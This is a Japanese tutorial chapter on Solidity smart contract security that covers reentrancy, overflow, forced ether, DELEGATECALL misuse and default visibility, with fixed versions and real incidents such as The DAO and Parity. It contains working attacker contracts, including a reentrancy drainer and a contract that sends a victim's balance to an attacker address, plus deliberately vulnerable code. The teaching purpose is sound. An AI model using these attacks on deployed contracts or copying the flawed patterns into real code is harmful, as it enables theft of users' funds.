= スマートコントラクトのセキュリティ

== スマートコントラクトにおけるセキュリティ

セキュリティはスマートコントラクトを書くときに最も重要なことの１つです。この章ではセキュリティのベストプラクティスとデザインパターン、そしてセキュリティ上やってはいけないことを紹介します。

他のプログラムと同様に、プログラマーが意図したとおりに正確にいつもスマートコントラクトが実行されることはありません。さらに、スマートコントラクトは公共物のため、誰でもスマートコントラクトとトランザクションを発行することでやり取りをすることができます。何らか脆弱性に晒されれば、回復できない損失を被ることになります。

== セキュリティベストプラクティス

Devensive programmingはスマートコントラクトにとても適したプログラムのスタイルです。以下がベストプラクティスです。

ミニマリズムと簡潔さ::
複雑さはセキュリティの敵です。簡潔であるほどコードは少なくなり、バグや予期しない影響が発生することが少なくなります。スマートコントラクトのコードが少ないかを見るべきであり、少なくする方法を発見しようとするべきです。プロジェクトが数千行のコードをスマートコントラクトで書いているならば、そのプロジェクトのセキュリティに疑問を持つべきです。シンプルであればあるほど、よりセキュアになります。

コードのクオリティ::

スマートコントラクトのコードは厳密でなくてはなりません。あらゆるバグは金銭的損失につながります。スマートコントラクトを一般的なプログラミングと同様にプログラムするべきではありません。SolidityでDAppsを書くのはJavascriptでウィジェットを作るのとワケが違います。むしろ航空宇宙工学のような厳密な開発手法を適用しなければなりません。一旦コードを立ち上げれば、どんな問題も修正することはできません。

読みやすさと監査::

コードは明快で読みやすくてはなりません。読みやすければ、コードの監査もしやすくなります。スマートコントラクトは公開されているので、誰でもバイトコードを読むことが出来ますし、誰でもリバースエンジニアリングが可能です。したがって共同作業やオープンソースの開発手法をとって、コードを公開して開発することは有益です。なぜなら、オープンソース開発の共通点から恩恵を受けたり、開発コミュニティの集合知を活用できるからです。Ethereumコミュニティのスタイルや命名規則を見習って、充実したドキュメントや読みやすいコードを書くべきなのです。

テストカバレッジ::

公開されているスマートコントラクトは誰でもどんなインプットでも実行できます。関数の引数といった入力が適切に構成されている、正しくバインドされている、良質な目的があると決して思い込んではいけません。コードの継続的な実行を許可する前に、すべての引数が適切な形式か、想定内であるかを確認するためにテストしましょう。

== セキュリティリスクとアンチパターン

スマートコントラクトの開発者は共通のセキュリティリスクをよく理解するべきで、そうすればコントラクトがリスクに晒されるプログラムのパターンを発見したり、避けることが可能です。次の章では、様々なセキュリティリスクやどのように脆弱性が生まれるのかの例、そうした脆弱性への対策や予防策を見ていきましょう。

== Reentrancy（リエントランシー）

Ethereumのスマートコントラクトの特徴の１つは他の外部コントラクトからコードを呼び出したり利用できることです。こうした操作はコントラクトが外部呼び出しの発行をする必要があります。こうした外部呼び出しは攻撃者によるハイジャックが可能で、コントラクト内でのコールバックを含めた、さらなるコードの実行を強制します。この種類の攻撃はDAOハックで使われました。

=== 脆弱性

この攻撃の種類はあるコントラクトが知らないアドレスにetherを送るときに発生する。攻撃者はfallback関数内に悪意のあるコードを含む外部アドレスでコントラクトを構築します。したがってあるコントラクトがこのアドレスにetherを送ると、悪意のあるコードが呼び出されます。Reentrancyという言葉は外部の悪意のあるコントラクトが脆弱性のあるコントラクト内の関数を呼び出し、コードの実行のパスがそれにreentersする事実に由来しています。

週に１etherを預金者が引き出すことのできるEthereumの金庫のような以下の脆弱性のあるコントラクトを見てみましょう。

.EtherStore.sol
====
[source, Javascript]
--------
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }
--------
====

このコントラクトにはdepositFundsとwithdrawFundsという２つのpublicな関数があります。depositFunds関数は単純に送信者の残高を増加させます。withdrawFunds関数は送信者が出金するweiの量を指定できます。この関数は指定された出金量が1etherよりも少なく、ここ１週間以内に出金されていなければ意図したとおり動作し成功します。

脆弱性はコントラクトがユーザーに指定された量のetherを送る17行目にあります。次の攻撃者が作成したコントラクトを見てみましょう。

.Attack.sol
====
[source, Javascript]
-------
import "EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
-------
====

まず攻撃者はconstructorのパラメータにEtherStoreのアドレスを入れて悪意のあるコントラクトを生成します。これによってpublic変数のetherstoreがコントラクトと紐付いて初期化されます。

攻撃者がattackEtherStore関数を1ether以上で呼び出します。例えば他の多くのユーザーもこのコントラクトにetherを預金して、現在のコントラクトの残高が10etherあると想定すると、攻撃は以下の手順で行われます。

1. Attack.sol, 15行目: EtherStoreコントラクトのdepositFunds関数がmsg.valueが1etherで呼ばれます。送信者は悪意のあるコントラクトです。よってコントラクトの残高は1etherになります。

2. Attack.sol, 17行目: 悪意のあるコントラクトはパラメータ1etherでEtherStoreのwithdrawFunds関数を呼びます。以前に出金されていないので全ての条件を通過します。

3. EtherStore.sol, 17行目: コントラクトは1etherを悪意のあるコントラクトに送ります。

4. Attack.sol, 25行目: 悪意のあるコントラクトへの支払いでfallback関数を実行します。

5. Attack.sol, 26行目: EtherStoreコントラクトの残高は10etherから現在9etherになります。そしてifの条件を通過します。

6. Attack.sol, 27行目: EtherStoreのwithdrawFunds関数を再び呼び出し、EtherStoreコントラクトに割り込みます。

7. EtherStore.sol, 11行目: withdrawFundsの２回目の呼び出しのとき、攻撃者であるコントラクトの残高は18行目が実行されてないので、まだ1etherのままです。lastWithdrawTime変数も同様にまだです。よって再び条件を通過します。

8. EtherStore.sol, 17行目: 攻撃者のコントラクトは他のユーザーの1etherを引き出します。

9. 4-8のステップをAttack.solの26行目"EtherStore.balance > 1"を満たしている間繰り返します。

10. Attack.sol, 26行目: EtherStoreコントラクトの残高が残り1ether以下になったとき、ifの条件を満たさなくなります。そのときEtherStoreコントラクトの18, 19行目がそれぞれのwithdrawFunds関数の呼び出しに対して実行されます。

11. EtherStore.sol, 18, 19行目: balanceとlastWithdrawTimeに値が入り、実行が終了します。

最終的な結果、攻撃者は１つのトランザクションでEtherStoreコントラクトから1ether以外すべて引き出したことになる。

=== 対策

スマートコントラクトの潜在的なReentrancy脆弱性を避ける技術はたくさんあります。１つは外部コントラクトにetherを移転するときに、ビルトインされているtransfer関数を使うことです。そのtransfer関数は外部呼び出しに2300gasだけを送るが、他のコントラクトを呼び出すアドレスやコントラクトにとっては不十分です。

２つ目の技術はコントラクト外にetherを送る前に状態変数を変更するすべてのロジックが確実に実行されるようにすることです。EtherStoreの例では、18, 19行目は17行目の前に置くべきです。この方法は、ローカル関数やコード実行中によく知らないアドレスに対して外部呼び出しをするどんなコードにとってもベストプラクティスです。

３つ目の技術はmutexを導入することです。これは割り込み呼び出しを防ぐために、コード実行中にコントラクトをロックする状態変数を追加するということです。

これら３つの技術を取り入れreentrancy対策をしたコントラクトが以下です。（本当は3つ全てを取り入れる必要はありません）

[source, Javascript]
------
contract EtherStore {

    // initialize the mutex
    bool reEntrancyMutex = false;
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(!reEntrancyMutex);
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
        // set the reEntrancy mutex before the external call
        reEntrancyMutex = true;
        msg.sender.transfer(_weiToWithdraw);
        // release the mutex after the external call
        reEntrancyMutex = false;
    }
 }
------

=== 現実の事例としてのThe DAO

The DAO攻撃はEthereumの開発初期に起きた最もメジャーなハッキングの１つでした。当時、そのコントラクトには150Mドル以上があり、Reentrancyはこの攻撃で重要な役割を果たしました。

== 算術オーバーフローとアンダーフロー

EVM（Ethereum Virtual Machine）は整数型を固定長で指定します。つまり整数型の変数はある範囲の数字しか表すことができません。uint8なら、0〜255の範囲内だけの数字を保存できます。256をuint8に格納しようとすると、0になります。注意不足でユーザーの入力が確認されず、計算が実行された結果の数字が格納するデータ型の範囲外の場合、Solidityの変数が悪用される可能性があります。

=== 脆弱性

変数のデータ型の範囲外の数字を格納する固定長の変数を必要とする操作を実行するときに、オーバーフローやアンダーフローは発生します。

例えば、uint8型の変数の0から1を減算すると255になり、これはアンダーフローです。uint8の範囲を下回る数字を割り当てているので、結果は折り返してuint8が格納できる最も大きい数字になります。同様に、256をuint8に加算するとその変数は変化しないでしょう。なぜならuint8全体の長さを一周するからです。

加算した値がデータ型の範囲を超えることをオーバーフローといいます。uint8で現在0の値に257を加算すると、1になります。

こうした数字の罠は攻撃者がコードを悪用したり、予期せぬロジックの流れを作ることを許してしまいます。例としてTimelockコントラクトを見てみましょう。

[source, Javascript]

------
contract TimeLock {

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(now > lockTime[msg.sender]);
        balances[msg.sender] = 0;
        msg.sender.transfer(balance);
    }
}
------

このコントラクトは時間型の金庫のように振る舞うように設計されています。ユーザーはコントラクトにetherを預金でき、最低１週間ロックできます。ユーザーは選択すれば、１週間以上の期間ロックすることもできます。

ユーザーが秘密鍵を渡すのを余儀なくされた場合に、こうしたコントラクトは短期間ユーザーのetherを入手困難にするということに便利かもしれません。しかしこのコントラクトにユーザーが100etherを預金して、攻撃者に秘密鍵が渡ってしまった場合、攻撃者はロックタイムに関係なくオーバーフローを使えばetherを受け取ることができます。

以下はアンダーフローの脆弱性をもつコントラクトです。
[source, Javascript]
------
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}
------

これはユーザーがトークンを移転することのできるtransfer関数をもつ簡単なトークンのコントラクトです。

欠陥はtransfer関数にあります。13行目のrequire条件はアンダーフローを使用することによって通過できるのです。残高が0のユーザーがいるとします。0じゃない_valueでtransfer関数を呼び出せば、13行目の条件を満たして通過します。なぜなら、balance[msg.sender]は0なので、どんな正の数字（2^256以外）で減算しても結果は0よりも大きくなるからです。14行目も同様に条件を通過します。よって、この場合攻撃者はアンダーフローの脆弱性を利用することで、自由にトークンを手に入れられます。

=== 対策

オーバーフローやアンダーフローの現在の防止策は標準の算術（加算、減算、乗算）を置き換える算術ライブラリを作るか、そうしたライブラリを使用することです。（オーバーフロー・アンダーフローが起きないので除算は除外）

ありがたいことにOpenZeppelinがEthereumコミュニティのために安全なライブラリを作って、監査もしてくれています。特にSafeMathライブラリはオーバーフロー・アンダーフローを避けることができます。Solidityでこのライブラリをどのように使用するか、SafeMathライブラリを使用して先程のコントラクトを修正して実際に見てみましょう。オーバーフロー対策されたコントラクトがこちらです。

[source, Javascript]
------
library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // This holds in all cases
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract TimeLock {
    using SafeMath for uint; // use the library for uint type
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() public payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        lockTime[msg.sender] = now.add(1 weeks);
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(now > lockTime[msg.sender]);
        balances[msg.sender] = 0;
        msg.sender.transfer(balance);
    }
}
------
標準の算術処理がすべてSafeMathで定義されたものに置き換わっているのが分かります。もはやこのコントラクトではアンダーフロー・オーバーフローは発生しません。

=== 現実の事例としてのPoWHC（Proof of Work Weak Hands Coin）とBatch Transferオーバーフロー

ジョークとして考案されたPoWHCはインターネット上の集団による詐欺でした。不幸なことに、コントラクトを書いた人は予めオーバーフローとアンダーフローを確認しておらず、結果としてコントラクトから866etherが流出しました。

他の例としては、ERC-20トークンコントラクトの中にあるbatchTransfer関数の実装が原因で発生したものもあります。その実装はオーバーフローの脆弱性を持っていました。

== 予期しないEther

通常、etherをコントラクトに送るときfallback関数かコントラクト内に定義された関数を実行します。これには２つの例外があり、なにもコードを実行せずにコントラクト内にetherが存在することが可能です。etherの送信にコード実行を当てにしているコントラクトは攻撃者からetherが強制的に送られてくるという脆弱性があります。

=== 脆弱性

防御的なプログラミング技法はinvariant checkingで、正しい状態遷移を強制することや操作を検証することに役立ちます。この方法は不変条件を定義したり、ある操作の後に変化してないことを確認するということを含みます。こうした例の１つは固定量を発行するERC-20トークンのtotalSupplyです。関数はこの不変条件を変更する必要がないので、transfer関数が意図した通りに動作するかを保証するためにtotalSupplyが不変であることを確認するcheckをtransfer関数に追加します。

特に、使用する魅力があるが実際には外部のユーザーに操作される可能性のある明らかな不変条件があります。これはコントラクト内に格納されている現在のetherです。開発者が始めてSolidityを習得するときに、よくpayable関数を介してしかコントラクトはetherを受け入れないという誤った解釈を持つことがあります。この誤解はコントラクトがether残高を誤って勘定することに繋がり、脆弱性を生みます。この脆弱性の原因は間違ったthis.balanceの使い方です。

payable関数やコントラクト内の関数を実行する以外にコントラクトにetherを送る方法は2つあります。

==== Self-destruct/suicide

どんなコントラクトでもselfdestruct関数を実装することができ、この関数はそのコントラクトアドレスからすべてのバイトコードを取り除き、そこに格納されているetherを指定したアドレスに送信します。

もしこの指定するアドレスをあるコントラクトにした場合でも、そのコントラクトの関数は何も呼び出しません。したがってselfdestruct関数はコントラクト内にどんなコードがあるか関係なく、たとえpayable関数がなかったとしても強制的にetherを送ることができます。つまり攻撃者はselfdestruct関数を実装したコントラクトを作成し、対象（target）のコントラクトアドレスをselfdestruct関数の引数にとってselfdestruct(target)呼び出せば、強制的にetherを対象のコントラクトに送ることができます。

==== Pre-sent ether

コントラクトにetherを入れるもう１つの方法は、事前にコントラクトアドレスにetherを入れておくことです。コントラクトアドレスはコントラクトを作成するアドレスとコントラクト作成トランザクションのナンスのKeccak-256のハッシュ値から算出され、決定します。つまり誰でもコントラクトが作成される前になるかもしれないコントラクトアドレスを算出することができ、そのアドレスにetherを送っておけるのです。そうするとコントラクトが作成されたときに、0でないetherの残高を持つことになります。

実際に見てみましょう。
[source, Javascript]
------
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;

    mapping(address => uint) redeemableEther;
    // Users pay 0.5 ether. At specific milestones, credit their accounts.
    function play() public payable {
        require(msg.value == 0.5 ether); // each play is 0.5 ether
        uint currentBalance = this.balance + msg.value;
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        // if at a milestone, credit the player's account
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(this.balance == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
------

このコントラクトは簡単なゲームで、プレイヤーは３つのマイルストーンのうち１つに最初に到達するのを期待して0.5etherをこのコントラクトに送ります。最初にマイルストーンに到達すればゲームが終わったときにetherの一部を獲得できます。最後のマイルストーン（10ether）に到達したときにゲームは終了します。

このコントラクトの問題は14行目と32行目のthis.balanceの下手な使い方に起因しています。攻撃者はプレイヤーがマイルストーンに到達するのを防ぐためにselfdestruct関数を介して0.1etherのような少額のetherを強制的に送ります。this.balanceはこの0.1etherの送金によって0.5etherの倍数には決してならないでしょう。なぜならすべての真っ当なユーザーは0.5etherしか増やすことができないからです。これによって、18, 21, 24の条件式が真になるのを妨げます。

さらに悪いこととして、マイルストーンを無視するひどい攻撃者は10etherを強制的に送り、コントラクト内に全ての報酬を永久にロックします。なぜならclaimReward関数は32行目の条件（this.balanceがfinalMileStoneよりも多い）によって、通過できないからです。

== 対策

通常この脆弱性はthis.balanceの誤計測によって発生します。可能な限りコントラクトロジックはコントラクトの正確な残高の値に依存することは避けるべきです。なぜなら、コントラクトロジックは人為的に操作できるからです。this.balanceをもとにロジックを作ると、予想外の残高を扱いかねません。

正確なetherの残高が必要ならば、payable関数内で増やしていく自分で定義した変数を使用するべきです。この変数はselfdestruct関数呼び出しを介する強制的なetherの影響は受けません。

対策をしたコントラクトが以下です。
[source, Javascript]
------
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;
    uint public depositedWei;

    mapping (address => uint) redeemableEther;

    function play() public payable {
        require(msg.value == 0.5 ether);
        uint currentBalance = depositedWei + msg.value;
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        depositedWei += msg.value;
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(depositedWei == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
------

こちらでは、新しい変数depositedEtherを定義しており、既知のetherの預金を追跡します。

== DELEGATECALL

CALLやDELEGATECALLはEtheruem開発者がコードをモジュール化するのに役立ちます。標準のコントラクトに対する外部呼び出しメッセージはCALLによって操作され、外部コントラクトや外部関数としてコードが実行されます。DELEGATECALLは対象アドレスでのコード実行が呼び出しているコントラクト上として実行され、msg.senderとmsg.valueがそのまま変わらないということ以外は同じです。この特徴は開発者がコードの再利用や将来のコントラクトからの呼び出しのできるライブラリの実装を可能にします。

そしてDELEGATECALLの使用は予想外のコード実行を引き起こすことがあります。

=== 脆弱性

DELEGATECALLのコード実行の文脈を保護する性質の結果として、脆弱性を克服したライブラリの構築は簡単ではないです。ライブラリのコード自体が安全で脆弱性を克服していても、他のアプリケーションの文脈において実行されたときに新たな脆弱性が発生する可能性があります。この複雑な事例をフィボナッチ数列を使いながら見てみましょう。

FibonacciLib.solライブラリはフィボナッチ数列や似たような数列を生成します。

.FibonacciLib.sol
[source, Javascript]
------
// library contract - calculates Fibonacci-like numbers
contract FibonacciLib {
    // initializing the standard Fibonacci sequence
    uint public start;
    uint public calculatedFibNumber;

    // modify the zeroth number in the sequence
    function setStart(uint _start) public {
        start = _start;
    }

    function setFibonacci(uint n) public {
        calculatedFibNumber = fibonacci(n);
    }

    function fibonacci(uint n) internal returns (uint) {
        if (n == 0) return start;
        else if (n == 1) return start + 1;
        else return fibonacci(n - 1) + fibonacci(n - 2);
    }
}
------

このライブラリは任意のフィボナッチ数列を生成する関数を提供しています。ユーザーは数列の初項を変更したり、新しい数列でフィボナッチのような数字を算出することができます。

このライブラリを利用したコントラクトを見てみましょう。

.FibonacciBalance.sol
[source, Javascript]
------
contract FibonacciBalance {

    address public fibonacciLibrary;
    // the current Fibonacci number to withdraw
    uint public calculatedFibNumber;
    // the starting Fibonacci sequence number
    uint public start = 3;
    uint public withdrawalCounter;
    // the Fibonancci function selector
    bytes4 constant fibSig = bytes4(sha3("setFibonacci(uint256)"));

    // constructor - loads the contract with ether
    constructor(address _fibonacciLibrary) public payable {
        fibonacciLibrary = _fibonacciLibrary;
    }

    function withdraw() {
        withdrawalCounter += 1;
        // calculate the Fibonacci number for the current withdrawal user-
        // this sets calculatedFibNumber
        require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));
        msg.sender.transfer(calculatedFibNumber * 1 ether);
    }

    // allow users to call Fibonacci library functions
    function() public {
        require(fibonacciLibrary.delegatecall(msg.data));
    }
}
------

このコントラクトはユーザーが出金する順番のフィボナッチ数に応じた量のetherを出金することができます。例えば初めのユーザーは1etherを手に入れ、２人目のユーザーも1etherを、３人目は2ether、４人目は3ether、５人目は5etherというように手に入れます。

このコントラクトには説明する必要のある要素がたくさんあります。まず、fibSigという面白い変数があります。これは文字列setFibonacci(uint256)のKeccak-256ハッシュの最初の4バイトを持っています。これはfunction selectorとして知られており、スマートコントラクトのどの関数を呼び出すかを指定するためにcalldataを入れます。fibSigは実行したいfibonacci(uint256)を指定するために、21行目delegatecall関数で使用されています。delegatecallの２つ目の引数には関数を渡します。次に、FibonacciLibライブラリのアドレスがコンストラクタ内で正確に参照されていると想定します。

状態変数のstartがライブラリとライブラリを呼び出しているコントラクトの両方で使われていることに気づいたかもしれません。ライブラリではstartはフィボナッチ数列の初項を指定するために使われており0がセットされています。一方、呼び出し側のコントラクトでは3がセットされています。

FibonacciBalanceコントラクト内のfallback関数はライブラリコントラクトに渡すすべての呼び出しを許可しており、ライブラリコントラクトのsetStart関数を呼び出すことができます。コントラクトの状態を保護していることを思い出すと、この関数はローカルのFibonacciBalanceコントラクト内でstart変数の状態を変更できるということです。よって、calculatedFibNumberの結果がstart変数に依存しているためより多くのetherを出金出来てしまします。

実際の例を見る前に、状態変数がどのようにコントラクトに格納されているかを確認してみましょう。状態やストレージの変数はコントラクトに格納されるものとして実際はslotに格納されます。

例としてライブラリコントラクトを見てみましょう。startとcalculatedFibNumberという２つの状態変数があります。１つ目の変数startはコントラクトストレージのslot[0]に格納されます。２つ目の変数calculatedFibNumberは隣の利用可能なストレージであるslot[1]に格納されます。setStart関数は入力値が何であろうとstartに入力値をセットします。同様に、setFibonacci関数もcalculatedFibNumberにfibonacci(n)の結果をセットします。つまりslot[1]にfibonacci(n)の結果がセットされます。

ではFibonacciBalanceコントラクトを見てみましょう。ストレージのslot[0]はfibonacciLibraryアドレスと対応しており、slot[1]はcalculatedFibNumberと対応しています。これは脆弱性が発生する正しくない紐づけ方です。delegatecallはコントラクトのコンテキストを保護するものです。つまりdelegatecallを介してコードを実行すると、呼び出す側のコントラクトのストレージなどの状態をもって振る舞うことになります。

withdrawの21行目で実行しているfibonacciLibrary.delegatecall(fibSig,withdrawalCounter)を見てみましょう。これはsetFibonacci関数を呼び出し、前述の通り現在のコンテキストにおいてはcalculatedFibNumberであるストレージslot[1]を変更します。これは予想だと、実行後にcalculatedFibNumberが変更されるはずです。しかしながら、FibonacciLibコントラクト内ではstart変数がストレージslot[0]に配置されていましたが、現在のコントラクト内ではslot[0]はfibonacciLibraryアドレスが配置されていることを思い出しましょう。つまり、fibonacci関数は予想外の結果を生みます。なぜならstart（slot[0]）を参照しているつもりが、現在の呼び出しの文脈ではfibonacciLibraryアドレスを参照するからです。したがって、withdraw関数は実行が通らないでしょう。なぜならcalculatedFibNumberが返すだろうuint(fibonacciLibrary)型のether量ではないからです。（本来ライブラリ側のslot[0]にはstart(uint型)がありslot[0]を見て処理をするが、delegatecallでコンテキストが保護されるため呼び出し側のslot[0]であるfibonacciLibrary(address型)が処理に用いられる。結果uint型が返ってこない）

さらに悪いことに、26行目のfallback関数を介してFibonacciBalanceコントラクトはユーザーがfibonacciLibraryの関数をすべて呼ぶことを可能にします。そしてこれはsetStart関数を含んでいるので、誰でもストレージのslot[0]を変更したり、セットすることができます。この場合ストレージのslot[0]にはfibonacciLibraryアドレスがあります。よって攻撃者はそのアドレスをuintに変更したり、setStartを呼び出すような悪意のあるコントラクトを作成することができます。そしておそらくfibonacciLibraryアドレスを攻撃用のコントラクトのアドレスに変えるでしょう。fibonacciLibraryアドレスを攻撃用コントラクトのアドレス変更したことによって、ユーザーがwithdrawやfallback関数を呼び出すたびに悪意のあるコントラクトは実行されるでしょう。

以下が例です。
[source, Javascript]
------
contract Attack {
    uint storageSlot0; // corresponds to fibonacciLibrary
    uint storageSlot1; // corresponds to calculatedFibNumber

    // fallback - this will run if a specified function is not found
    function() public {
        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
        // is called we don't send out any ether
        <attacker_address>.transfer(this.balance); // we take all the ether
    }
 }
------

この攻撃用のコントラクトはslot[1]を変更することによって、calculatedFibNumberを変更します。

重要なのはdelegatecallが状態を保護しているというとき、それはコントラクトの変数名ではなく、それらの名前が指し示す実際のストレージslotについてだということに気づくことです。

=== 対策

Solidityはライブラリ実装をするためのライブラリkeywordを提供しています。これによって、ライブラリコントラクトがstatelessであるかや、non-self-destructableであるかを確認します。ライブラリはストレージコンテキストの複雑さを緩和するためにstatelessでなくてはなりません。statelesなライブラリは攻撃者がライブラリのコードに依存しているコントラクトに影響を与えるために直接ライブラリの状態を変更してしまうような攻撃を防ぐことができます。一般的な例として、DELEGATECALLを使用するときはライブラリコントラクトと呼び出し側コントラクト両方のコンテキストにできるだけ注意を払った方がよく、可能ならばstatelessなライブラリを作った方がよいです。

=== 現実の事例としてのParity Multisig Wallet(Second Hack)

このハッキングは意図しないコンテキストで実行された場合によく書かれたライブラリのコードがどう悪用されるかの事例です。
実際にコードを確認してみましょう。

.ライブラリコントラクト
[source, Javascript]
------
contract WalletLibrary is WalletEvents {

  ...

  // throw unless the contract is not yet initialized.
  modifier only_uninitialized { if (m_numOwners > 0) throw; _; }

  // constructor - just pass on the owner array to multiowned and
  // the limit to daylimit
  function initWallet(address[] _owners, uint _required, uint _daylimit)
      only_uninitialized {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }

  // kills the contract sending everything to `_to`.
  function kill(address _to) onlymanyowners(sha3(msg.data)) external {
    suicide(_to);
  }

  ...

}
------

.ウォレットコントラクト
[source, Javascript]
------
contract Wallet is WalletEvents {

  ...

  // METHODS

  // gets called when no other function matches
  function() payable {
    // just being sent some cash?
    if (msg.value > 0)
      Deposit(msg.sender, msg.value);
    else if (msg.data.length > 0)
      _walletLibrary.delegatecall(msg.data);
  }

  ...

  // FIELDS
  address constant _walletLibrary =
    0xcafecafecafecafecafecafecafecafecafecafe;
}
------

Walletコントラクトはすべての呼び出しをdelegatecallを介してWalletLibraryコントラクトに渡しています。これらのコントラクトの意図はWalletLibraryコントラクト内にウォレットのコードベースと主な関数のある簡単かつ低コストでデプロイ可能なWalletコントラクトを持つことでした。不幸なことに、WalletLibraryはそれ自体がコントラクトであり、状態を持っています。

ゆえにWalletLibraryコントラクト自体が自身に呼び出しを送ることができます。特にWalletLibraryコントラクトでは初期化をして所有者になることが可能でした。実際あるユーザーがWalletLibrary上のinitWallet関数を呼び出すことで、そのライブラリの所有者になりました。そのユーザーは続いてkill関数も呼び出しました。そのユーザーがライブラリの所有者なので、modifierも通過し、そのライブラリコントラクトはself-destructedしました。このライブラリを参照し、この参照を変更したりetherを引き出すメソッドを持ってなかったすべてのWalletコントラクトは、WalletLibraryと共に無くなりました。結果として、このタイプのParityのマルチシグウォレット内にあったすべてのetherは失くなり、永久に取り戻せなくなりました。

== Default Visibilities

Solidity内の関数にはどのようにその関数を呼び出すことができるかのvisibility指定子があります。visibilityは関数が外部ユーザーも呼び出せるのか、他のコントラクトから呼び出せるのか、内部だけなのか、外部だけなのかのいずれかを決定します。デフォルトではpublicになっており、ユーザーは外部から呼び出すことができます。スマートコントラクトにおいてvisibility指定子をどう誤用すると脆弱性につながるのかを確認しましょう。

== 脆弱性

デフォルトでは関数のvisibility指定子はpublicなので、visibilityを指定しない関数は外部ユーザーから呼び出せることになります。問題はprivateにするべき、もしくはコントラクト内だけで呼び出せるようにするべきの関数に開発者が誤ったvisibility指定子をつけてしまうことから発生します。

以下例です。
[source, Javascript]
------
contract HashForEther {

    function withdrawWinnings() {
        // Winner if the last 8 hex characters of the address are 0
        require(uint32(msg.sender) == 0);
        _sendWinnings();
     }

     function _sendWinnings() {
         msg.sender.transfer(this.balance);
     }
}
------

